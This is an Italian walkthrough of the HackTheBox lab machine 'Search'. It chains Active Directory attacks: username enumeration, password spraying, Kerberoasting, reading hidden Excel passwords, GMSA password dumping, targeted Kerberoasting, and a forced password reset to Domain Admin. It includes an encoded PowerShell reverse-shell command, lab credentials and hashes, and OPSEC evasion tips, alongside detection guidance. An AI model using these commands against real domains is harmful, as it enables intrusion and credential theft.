---
title: 'HTB Search Walktrough – GMSA, Kerberoast e AD Certificate '
slug: htb-search-walkthrough
description: 'Writeup completo di HTB Search: foothold tramite credenziali in un''immagine, Kerberoasting, GMSA abuse e due path distinti verso Domain Admin. '
image: /search (1).webp
draft: false
date: 2026-06-11T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - targeted-kerberoast
  - gmsa-password
  - password-spray
---

Search è una macchina Windows Hard su HackTheBox (HTB) ,anche se la classificherei più come medium, costruita interamente su Active Directory. La verità è che all'inizio non si capisce da dove partire — il sito sembra un sito aziendale generico, i servizi esposti sono tanti e le prime ore si passano a girare in tondo. Il percorso copre Kerberoasting, password spray, un Excel con colonna nascosta, GMSA abuse e Targeted Kerberoasting. Esistono due path distinti per arrivare a root — li analizziamo entrambi.

***

## Ricognizione

```bash
mynmap 10.129.229.57
```

Firma classica di un Domain Controller: porte 53, 88, 389, 445, 636, 3268, 3269, 9389. Il certificato TLS sulla 443 ha CN `research` — aggiungiamo subito `research.search.htb` agli hosts. La porta 8172 è IIS WebDeploy, non certsrv come si potrebbe pensare.

```
10.129.229.57  search.htb research.search.htb
```

***

## La Fase Confusa – Enumerazione Iniziale

Il sito `http://search.htb` è un sito aziendale con foto di dipendenti, testi generici e nessun form di login visibile. Prima impressione: niente di utile.

Prendo i nomi delle persone visibili nella pagina e costruisco una lista di possibili username secondo lo schema `firstname.lastname`, poi verifico con kerbrute:

```bash
kerbrute userenum -d search.htb --dc 10.129.229.57 user.txt
# [+] VALID USERNAME: keely.lyons@search.htb
# [+] VALID USERNAME: dax.santiago@search.htb
# [+] VALID USERNAME: sierra.frye@search.htb
```

Tre utenti validi. Bene — ma senza password non andiamo da nessuna parte. Tentativo AS-REP Roasting con GetNPUsers: nessuno dei tre ha pre-auth disabilitata. Password spray con credenziali comuni: niente.

In questa fase ho anche tentato di esplorare la superficie ADCS — il certificator scanner identifica **ESC8** (Web Enrollment su HTTP senza Channel Binding). Ho provato relay con ntlmrelayx verso `http://search.htb/certsrv/certfnsh.asp --adcs` combinato con PetitPotam per la coercion. Il relay riceveva connessioni ma non produceva certificati — probabile bug di impacket 0.13.1 nella gestione del path URL completo in modalità ADCS. Strada abbandonata. Per il funzionamento teorico dell'attacco: [ESC8 – NTLM Relay ad ADCS](https://hackita.it/articoli/esc8-adcs/).

La svolta arriva guardando meglio il sito. Non il testo — le **immagini**. Nel carosello c'è una foto con un'agenda aperta. Leggendo con attenzione si distingue:

> *Send password to Hope Sharp*\
> *IsolationIsKey?*

Credenziali in chiaro in una foto pubblica. Lo schema username è `firstname.lastname`:

```bash
nxc smb 10.129.229.57 -u hope.sharp -p 'IsolationIsKey?'
# [+] search.htb\hope.sharp:IsolationIsKey?
```

***

## Enumerazione Utenti e Password Spray

Con `hope.sharp` autenticato enumeriamo tutti gli utenti del dominio:

```bash
nxc smb 10.129.229.57 -u hope.sharp -p 'IsolationIsKey?' --users
```

Otteniamo la lista completa degli account AD. Password spray con la password trovata nell'immagine su tutti gli utenti enumerati:

```bash
nxc smb 10.129.229.57 -u users.txt -p 'IsolationIsKey?' --continue-on-success
```

Nessun altro account riusa quella password. Passiamo al Kerberoasting.

***

## Kerberoasting – web\_svc

Con credenziali valide lanciamo GetUserSPNs:

```bash
GetUserSPNs.py 'search.htb/hope.sharp:IsolationIsKey?' -request -dc-ip 10.129.229.57
```

Hash TGS per `web_svc`. Cracking:

```bash
hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt
# web_svc:@3ONEmillionbaby
```

`web_svc` è descritto come *"Temp Account created by HelpDesk"*. La password è stata riusata da chi l'ha creato. Password spray sui membri del gruppo HelpDesk:

```bash
nxc smb 10.129.229.57 -u helpdesk_users.txt -p '@3ONEmillionbaby'
# [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby
```

***

## Excel – Phishing\_Attempt.xlsx e il Bypass dell'Hash

Sulla share `RedirectedFolders$` come `Edgar.Jacobs` troviamo `Phishing_Attempt.xlsx` sul Desktop. Il foglio "Passwords 01082020" ha la colonna C nascosta e protetta con password.

Primo tentativo: estrarre l'hash e craccare con hashcat.

```bash
unzip -d phis_extract Phishing_Attempt.xlsx
```

Nel file `xl/worksheets/sheet2.xml` troviamo il tag di protezione:

```xml
<sheetProtection algorithmName="SHA-512" 
  hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+..." 
  saltValue="U9oZfaVCkz5jWdhs9AA8nA==" 
  spinCount="100000"/>
```

Costruiamo l'hash per mode 25300 e lanciamo hashcat:

```bash
hashcat -m 25300 hash.txt /usr/share/wordlists/rockyou.txt
# → zero risultati
```

Rockyou non cracca l'hash. Ma qui arriva il punto cruciale: **la protezione del foglio in Excel non cifra i dati — li nasconde soltanto**. Il contenuto rimane nei file XML interni. Leggiamo direttamente `sharedStrings.xml`:

```bash
batcat xl/sharedStrings.xml
```

Le password sono lì, in chiaro, nell'XML:

```
$$49=wide=STRAIGHT=jordan=28$$18
;;36!cried!INDIA!year!50;;
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
[...]
```

La colonna nascosta non serviva craccarla — bastava leggere il file sorgente. Password spray con le coppie username:password estratte:

```bash
nxc smb 10.129.229.57 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
```

User flag nella share di `Sierra.Frye`.

***

## Escalation – La Catena BloodHound

BloodHound mostra il percorso verso il Domain Admin:

```
Sierra.Frye → BIRMINGHAM-ITSEC → ITSEC → ReadGMSAPassword → BIR-ADFS-GMSA$
BIR-ADFS-GMSA$ → GenericAll → Tristan.Davies → Domain Admins
```

### Path 1 (quello che ho usato) – GMSA + Targeted Kerberoast + pth-net

**Dump GMSA password:**

```bash
nxc ldap 10.129.229.57 -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --gmsa
# BIR-ADFS-GMSA$  NTLM: e1e9fd9e46d0d747e1595167eedcec0f
```

Verifica PTH:

```bash
nxc smb 10.129.229.57 -u 'BIR-ADFS-GMSA$' -H e1e9fd9e46d0d747e1595167eedcec0f
# [+] (Pwn3d! sulla macchina locale, non ancora DA)
```

**Targeted Kerberoast su Tristan.Davies:**

Con `GenericAll` sull'account possiamo impostare un SPN arbitrario, richiedere il TGS e rimuoverlo subito. È il Targeted Kerberoasting — non aspettiamo di trovare un account kerberoastabile, lo creiamo noi:

```bash
targetedKerberoast.py -v -d 'search.htb' -u 'BIR-ADFS-GMSA$' -H 'e1e9fd9e46d0d747e1595167eedcec0f'
```

Il tool stampa l'hash TGS di `Tristan.Davies`. Tentativo di crack con john e rockyou — zero risultati, password non nel dizionario.

Non serve craccarla. `GenericAll` ci permette di **resettare direttamente la password**:

```bash
pth-net rpc password "Tristan.Davies" "Hackita1@" \
  -U "search.htb"/"BIR-ADFS-GMSA$"%"ffffffffffffffffffffffffffffffff":"e1e9fd9e46d0d747e1595167eedcec0f" \
  -S "research.search.htb"
```

```bash
nxc smb 10.129.229.57 -u 'Tristan.Davies' -p 'Hackita1@' -x 'powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAG..'
# [+] search.htb\Tristan.Davies:Hackita1@ (Pwn3d!)
```

Shell con reverse shell via nxc `-x` e Domain Admin raggiunto.

***

### Path 2 (alternativo, quello inteso) – Certificato PFX + PowerShell Web Access

Nella share di `Sierra.Frye`, sotto `Downloads\Backups`, ci sono due certificati:

```
search-RESEARCH-CA.p12
staff.pfx
```

Entrambi protetti da password. Hash con pfx2john, cracking con john:

```bash
pfx2john staff.pfx > staff.hash
john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
# misspissy
```

Importiamo entrambi in Firefox con password `misspissy`. Visitando `https://search.htb/staff` (HTTPS obbligatorio) il browser chiede il certificato client. Selezioniamo quello importato — si apre una pagina di **PowerShell Web Access**.

Login come `Sierra.Frye`, computer name `research`. Shell PowerShell remota nel browser. Da lì, dump GMSA e reset password in PowerShell nativo:

```powershell
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$SecPass = (ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword').SecureCurrentPassword
$cred = New-Object System.Management.Automation.PSCredential 'BIR-ADFS-GMSA$', $SecPass
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {
    Set-ADAccountPassword -Identity tristan.davies -reset `
    -NewPassword (ConvertTo-SecureString -AsPlainText 'Hackita1@' -force)
} -Credential $cred
```

Stesso risultato finale — Domain Admin.

***

## MITRE ATT\&CK

| Tecnica                               | ID        |
| ------------------------------------- | --------- |
| Valid Accounts                        | T1078     |
| Kerberoasting                         | T1558.003 |
| Targeted Kerberoasting                | T1558.003 |
| Password Spraying                     | T1110.003 |
| Unsecured Credentials in Files        | T1552.001 |
| GMSA Password Read                    | T1555     |
| Account Manipulation – Password Reset | T1098.001 |
| Pass the Hash                         | T1550.002 |

***

## OPSEC

* **Kerberoasting**: genera richieste TGS visibili (Event ID 4769). Preferire account con RC4 disabilitato per ridurre la rilevabilità.
* **Password spray**: usare delay tra i tentativi per non triggerare lockout policy — il limite di default in AD è spesso 5 tentativi.
* **pth-net password reset**: operazione rumorosa — genera Event ID 4723/4724. In un engagement reale preferire l'abuso diretto delle permission senza modifiche permanenti dove possibile.
* **Targeted Kerberoast**: il tool aggiunge e rimuove lo SPN automaticamente ma la modifica è loggata (Event ID 4742). Finestra di esposizione breve ma esiste.
* **GMSA dump via LDAP**: meno rumoroso, ma visibile nei log LDAP se il monitoraggio è attivo.

***

## Detection

* **Event ID 4769** con encryption type 0x17 (RC4): possibile Kerberoasting in corso.
* **Event ID 4724/4723**: reset password di account privilegiati da account insoliti o fuori orario.
* **Event ID 4742**: SPN aggiunto e rimosso in pochi secondi sullo stesso account = segnale di Targeted Kerberoast.
* **Accesso LDAP a msDS-ManagedPassword**: monitorabile tramite SACL sull'attributo — raramente configurato di default.
* Monitorare accessi a certsrv da IP non autorizzati e request di enrollment anomale.

***

## Conclusioni

Search insegna una cosa importante: i dati sono spesso accessibili anche quando sembrano protetti. La colonna nascosta dell'Excel aveva l'hash SHA-512 incraccabile — ma le password erano comunque lì, nel XML sottostante, leggibili senza craccare nulla. La protezione del foglio Excel non è cifratura.

Il path via GMSA + pth-net è più diretto e non richiede il bypass del PFX. Entrambi i path convergono sullo stesso abuso del privilegio `ReadGMSAPassword` — BloodHound rende evidente una catena che altrimenti richiederebbe ore di enumerazione manuale.
